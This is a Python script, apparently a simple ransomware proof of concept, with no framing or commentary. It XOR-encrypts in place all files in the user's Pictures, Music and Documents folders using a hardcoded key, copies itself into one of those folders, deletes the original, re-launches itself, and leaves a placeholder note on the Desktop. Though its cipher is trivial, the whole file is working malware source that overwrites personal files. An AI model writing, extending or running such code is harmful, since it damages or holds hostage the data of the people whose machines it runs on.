import os
import shutil
import sys
import random

PASSWORD = "hello"
INDICATOR_FILE = ".encrypted"

def xor_encrypt_decrypt(data, key):
    key = (key * (len(data) // len(key) + 1))[:len(data)]
    return bytes([d ^ ord(k) for d, k in zip(data, key)])

def encrypt_folder(folder_path):
    indicator_path = os.path.join(folder_path, INDICATOR_FILE)
    if os.path.exists(indicator_path):
        print(f"Files in {folder_path} are already encrypted. Skipping encryption.")
        return
    
    for root, dirs, files in os.walk(folder_path):
        for filename in files:
            file_path = os.path.join(root, filename)
            if filename != os.path.basename(__file__):
                try:
                    with open(file_path, 'rb') as file:
                        file_data = file.read()
                    
                    encrypted_data = xor_encrypt_decrypt(file_data, PASSWORD)
                    
                    with open(file_path, 'wb') as file:
                        file.write(encrypted_data)
                    print(f"Encrypted: {file_path}")
                except Exception as e:
                    print(f"Failed to encrypt {file_path}: {e}")
    
    with open(indicator_path, 'w') as indicator_file:
        indicator_file.write("encrypted")
    print(f"Encryption complete for {folder_path}. Indicator file created.")

def move_to_folder(destination_folder):
    current_file = os.path.abspath(__file__)
    
    filename = os.path.basename(current_file)
    
    destination = os.path.join(destination_folder, filename)
    
    try:
        if current_file != destination:
            shutil.copy(current_file, destination)
            print(f"Copied to: {destination}")
            
            os.remove(current_file)
            print(f"Deleted original file: {current_file}")
            
            os.execl(sys.executable, sys.executable, destination)
        else:
            print(f"Skipping move, script is already in {destination_folder}.")
        
    except Exception as e:
        print(f"Error: {e}")

def process_folders():
    folders = [os.path.join(os.path.expanduser('~'), 'Pictures'),
               os.path.join(os.path.expanduser('~'), 'Music'),
               os.path.join(os.path.expanduser('~'), 'Documents')]
    
    first_folder, second_folder, third_folder = random.sample(folders, 3)
    
    encrypt_folder(first_folder)
    
    encrypt_folder(second_folder)
    
    encrypt_folder(third_folder)
    move_to_folder(third_folder)

def leave_note_on_desktop():
    desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
    note_file = os.path.join(desktop_path, 'note.txt')
    
    try:
        with open(note_file, 'w') as note:
            msg = "hello world"
            note.write(msg)
        print(f"Note created: {note_file}")
    except Exception as e:
        print(f"Failed to create note: {e}")

if __name__ == "__main__":
    if os.path.dirname(os.path.abspath(__file__)) != os.path.join(os.path.expanduser('~'), 'Documents'):
        process_folders()
        leave_note_on_desktop()
    else:
        print("Script is already in the Documents folder.")
